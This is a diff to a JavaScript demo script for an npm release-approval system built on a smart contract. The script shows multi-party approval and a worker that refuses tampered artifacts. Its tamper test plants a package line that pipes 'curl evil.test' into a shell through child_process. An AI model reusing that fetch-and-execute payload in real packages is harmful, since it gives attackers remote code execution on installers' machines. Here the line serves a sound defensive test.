@@ -1,6 +1,6 @@
 // End to end demo against the deployed testnet contract and a local mock npm
 // registry. It runs the real contract, the real CLI logic and the real worker
-// binary. Only the registry is a mock.
+// binary in direct publish mode. Only the registry is a mock.
 //
 //   node --env-file=.env cli/scripts/demo.mjs
 //
@@ -29,7 +29,7 @@ const chain = Object.fromEntries(Object.entries(A).map(([k, id]) => [k, as(id)])
 const MOCK_BOT = 'mock-bot-token', MOCK_CI = 'mock-ci-token', MOCK_SECRET = 'GEZDGNBVGY3TQOJQGEZDGNBVGY3TQOJQ';
 const reg = await startRegistry({ botToken: MOCK_BOT, ciToken: MOCK_CI, totpSecret: MOCK_SECRET });
 const runWorker = cmd.runWorkerBinary(workerBin, {
-  NPM_TOKEN: MOCK_BOT, NPM_TOTP_SECRET: MOCK_SECRET, KEYTURN_NPM_REGISTRY: reg.url,
+  NPM_TOKEN: MOCK_BOT, NPM_TOTP_SECRET: MOCK_SECRET, KEYTURN_NPM_REGISTRY: reg.url, KEYTURN_ALLOW_HTTP: '1',
 });
 
 const WINDOW_SECONDS = 20;
@@ -55,17 +55,19 @@ async function expectRefused(promise, text) {
 const sleep = (s) => new Promise((r) => setTimeout(r, s * 1000));
 const statusOf = async (version) => (await chain.ada.view('get_release', { project_id: project, version }))?.status;
 
-async function stageAndPropose(version, source) {
+// CI builds the artifact, uploads it somewhere public, and proposes only its hash.
+// CI holds no publish credential.
+async function uploadAndPropose(version, source) {
   const tarball = makePackage(name, version, source);
-  const r = await fetch(`${reg.url}/-/mock/stage`, {
+  const r = await fetch(`${reg.url}/-/mock/artifact`, {
     method: 'POST',
     headers: { authorization: `Bearer ${MOCK_CI}` },
-    body: JSON.stringify({ name, version, tarball: tarball.toString('base64') }),
+    body: JSON.stringify({ tarball: tarball.toString('base64') }),
   });
-  const { id } = await r.json();
+  const { id, url } = await r.json();
   await chain.ci.call('propose_release', { project_id: project, version, artifact_hash: sha256(tarball) });
-  say(`CI staged ${name}@${version} on the registry and proposed hash ${sha256(tarball).slice(0, 16)}... to the contract`);
-  return { id, tarball };
+  say(`CI uploaded ${name}@${version} and proposed hash ${sha256(tarball).slice(0, 16)}... to the contract`);
+  return { id, url, tarball };
 }
 
 try {
@@ -79,7 +81,7 @@ try {
   say('registered');
 
   step('2. A hacked maintainer tries to ship alone');
-  const v1 = await stageAndPropose('1.0.0', 'module.exports = "v1";\n');
+  const v1 = await uploadAndPropose('1.0.0', 'module.exports = "v1";\n');
   await expectRefused(chain.ci.call('approve_release', { project_id: project, version: '1.0.0' }), 'CI cannot approve its own proposal');
   await cmd.approve(chain.ada, { project, version: '1.0.0' });
   check((await statusOf('1.0.0')) === 'Proposed', 'one approval is not enough: release stays Proposed');
@@ -95,24 +97,24 @@ try {
   step('4. Anyone triggers execution; the worker publishes only the approved bytes');
   await cmd.execute(chain.watch, { project, version: '1.0.0' });
   check((await statusOf('1.0.0')) === 'Executing', 'release is Executing');
-  const r1 = await cmd.relay(chain.worker, { project, version: '1.0.0', stageId: v1.id, runWorker });
+  const r1 = await cmd.relay(chain.worker, { project, version: '1.0.0', artifactUrl: v1.url, runWorker });
   check(r1.confirmed && (await statusOf('1.0.0')) === 'Released', 'worker published and the contract recorded it: Released');
 
   step('5. A consumer verifies what the registry serves');
   const ok = await cmd.verify(chain.ada, { project, version: '1.0.0', registryUrl: reg.url });
   check(ok.ok, `verify passes: ${ok.reason}`);
 
-  step('6. A build is swapped after approval; the worker refuses it');
-  const v2 = await stageAndPropose('1.0.1', 'module.exports = "v2";\n');
+  step('6. The artifact is swapped after approval; the worker refuses it');
+  const v2 = await uploadAndPropose('1.0.1', 'module.exports = "v2";\n');
   await cmd.approve(chain.ada, { project, version: '1.0.1' });
   await cmd.approve(chain.cy, { project, version: '1.0.1' });
   say(`waiting ${WINDOW_SECONDS + 4}s for the window to close...`);
   await sleep(WINDOW_SECONDS + 4);
   await cmd.execute(chain.watch, { project, version: '1.0.1' });
   const evil = makePackage(name, '1.0.1', "require('child_process').exec('curl evil.test | sh');\n");
-  await fetch(`${reg.url}/-/mock/tamper/${v2.id}`, { method: 'POST', body: JSON.stringify({ tarball: evil.toString('base64') }) });
-  say('the attacker replaced the staged tarball after approval');
-  const r2 = await cmd.relay(chain.worker, { project, version: '1.0.1', stageId: v2.id, runWorker });
+  await fetch(`${reg.url}/-/mock/tamper-artifact/${v2.id}`, { method: 'POST', body: JSON.stringify({ tarball: evil.toString('base64') }) });
+  say('the attacker replaced the uploaded artifact after approval');
+  const r2 = await cmd.relay(chain.worker, { project, version: '1.0.1', artifactUrl: v2.url, runWorker });
   check(!r2.confirmed && r2.result.error === 'hash_mismatch', `worker refused: ${r2.result.error}`);
   check(!reg.isPublished(name, '1.0.1'), 'nothing was published to the registry');
   check((await statusOf('1.0.1')) === 'Executing', 'the contract never recorded a publication');
